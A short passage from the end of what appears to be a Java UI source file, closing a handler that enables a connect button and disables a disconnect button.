            } else {
                connectButton.setEnabled(true);
                disconnectButton.setEnabled(false);
            }
        });
    }
}